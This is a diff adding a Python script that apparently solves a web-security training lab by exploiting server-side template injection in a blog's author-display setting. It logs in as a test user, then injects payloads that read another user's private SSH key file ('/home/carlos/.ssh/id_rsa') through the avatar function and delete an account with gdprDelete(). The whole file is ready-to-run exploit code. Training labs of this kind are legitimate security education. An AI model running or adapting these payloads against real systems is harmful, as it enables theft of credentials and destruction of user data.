@@ -1,0 +1,86 @@
+import re
+import requests
+
+session = requests.session()
+base_url = input("Enter the lab URL: ").strip().rstrip("/")
+
+
+def get_csrf(html):
+    match = re.search(r'name="csrf"[^>]*value="([^"]+)"', html) or \
+            re.search(r'value="([^"]+)"[^>]*name="csrf"', html)
+    return match.group(1) if match else None
+
+
+
+PNG_BYTES = __import__("base64").b64decode(
+    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII="
+)
+
+
+login_page = session.get(f"{base_url}/login", timeout=10)
+login = session.post(f"{base_url}/login", data={
+    'csrf': get_csrf(login_page.text),
+    'username': 'wiener',
+    'password': 'peter'
+}, timeout=10)
+if login.url.endswith("/login"):
+    print("[*] Login failed. Check the credentials in the lab description.")
+    exit(1)
+print("[*] Logged in as wiener.")
+
+
+account = session.get(f"{base_url}/my-account", timeout=10)
+csrf = get_csrf(account.text)
+if not csrf:
+    print("[*] CSRF token not found on the account page.")
+    exit(1)
+
+
+upload = session.post(f"{base_url}/my-account/avatar",
+    files={'avatar': ('avatar.png', PNG_BYTES, 'image/png')},
+    data={'user': 'wiener', 'csrf': csrf}, timeout=10)
+print(f"[*] Avatar upload status: {upload.status_code}")
+
+
+home = session.get(base_url, timeout=10)
+post_match = re.search(r'postId=(\d+)', home.text)
+if not post_match:
+    print("[*] Could not find a blog post on the home page.")
+    exit(1)
+post_id = post_match.group(1)
+post_page = session.get(f"{base_url}/post?postId={post_id}", timeout=10)
+session.post(f"{base_url}/post/comment", data={
+    'csrf': get_csrf(post_page.text),
+    'postId': post_id,
+    'comment': "test comment",
+    'name': "wiener",
+    'email': "wiener@test.com",
+    'website': ""
+}, timeout=10)
+print(f"[*] Posted a test comment on post {post_id}.")
+
+
+def set_display_name(payload):
+    account_page = session.get(f"{base_url}/my-account", timeout=10)
+    token = get_csrf(account_page.text)
+    resp = session.post(f"{base_url}/my-account/change-blog-post-author-display", data={
+        'blog-post-author-display': payload,
+        'csrf': token
+    }, timeout=10)
+    return resp.status_code
+
+
+def render_post():
+    return session.get(f"{base_url}/post?postId={post_id}", timeout=10).status_code
+
+
+
+set_payload = "user.name}}{{user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')"
+print(f"[*] Save display name status: {set_display_name(set_payload)}")
+print(f"[*] Render status: {render_post()}")
+
+
+delete_payload = "user.name}}{{user.gdprDelete()"
+print(f"[*] Save display name status: {set_display_name(delete_payload)}")
+print(f"[*] Render status: {render_post()}")
+print("[*] Check the lab banner to confirm it is solved.")
